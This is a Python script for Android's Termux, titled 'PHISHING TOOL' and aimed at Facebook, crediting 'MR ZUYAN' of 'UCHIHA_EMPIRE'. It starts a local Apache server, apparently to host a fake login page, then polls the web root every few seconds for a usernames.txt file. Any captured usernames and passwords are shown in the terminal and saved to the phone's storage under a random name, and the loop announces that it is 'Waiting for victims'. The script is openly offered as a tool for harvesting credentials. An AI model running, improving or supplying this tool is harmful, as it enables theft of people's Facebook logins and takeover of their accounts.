import os
import time
import uuid
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich import print

R = "[bold red]"
G = "[bold green]"
B = "[bold blue]"
Y = "[bold yellow]"
C = "[bold cyan]"
M = "[bold magenta]"
W = "[bold white]"
RESET = "[/]"  # To reset rich style

console = Console()

# Display logo
def display_logo():
    logo_text = Text()
    logo_text.append("[~] ", style="bold cyan")
    logo_text.append("Tools: ", style="bold white")
    logo_text.append("Phishing\n", style="bold green")

    logo_text.append("[~] ", style="bold cyan")
    logo_text.append("Version: ", style="bold white")
    logo_text.append("1.0\n", style="bold green")

    logo_text.append("[~] ", style="bold cyan")
    logo_text.append("Type: ", style="bold white")
    logo_text.append("Facebook\n", style="bold green")

    logo_text.append("[~] ", style="bold cyan")
    logo_text.append("Program by: ", style="bold white")
    logo_text.append("ZUYAN\n", style="bold magenta")

    logo_text.append("[~] ", style="bold cyan")
    logo_text.append("Team: ", style="bold white")
    logo_text.append("UCHIHA_EMPIRE", style="bold red")

    console.print(Panel(logo_text, title=f"{B}PHISHING TOOL{RESET}", subtitle="by MR ZUYAN", style="bold"))

# Start Apache Server
def start_apache():
    console.print(f"\n{Y}[~] Starting Apache server...{RESET}")
    os.system("termux-setup-storage")
    os.system("apachectl start || /data/data/com.termux/files/usr/bin/apachectl start")
    console.print(f"{G}[✓] Apache started.{RESET}")

# Show credentials if found
def show_credentials():
    path = "/data/data/com.termux/files/usr/share/apache2/default-site/htdocs/usernames.txt"
    if os.path.exists(path):
        console.print(f"\n{C}[~] Found {G}username & password {C}:{RESET}")
        with open(path, "r") as user_file:
            content = user_file.read()
            console.print(Panel(content, title=f"{G}Username File", style="green"))

        # Save to a random UUID filename before deleting
        unique_name = f"username_{uuid.uuid4().hex[:8]}.txt"
        with open(f"/sdcard/{unique_name}","w") as save_file:
            save_file.write(content)
        console.print(f"{M}[+] Saved credentials to {unique_name}{RESET}")

        os.remove(path)  # Delete original file

# Main
def main():
    os.system("clear")
    display_logo()
    start_apache()
    console.print(f"\n{Y}[~] Waiting for victims... Press CTRL+C to stop.{RESET}")
    try:
        while True:
            show_credentials()
            time.sleep(3)
    except KeyboardInterrupt:
        console.print(f"\n\n{R}[!] Stopped by user.{RESET}")

if __name__ == "__main__":
    main()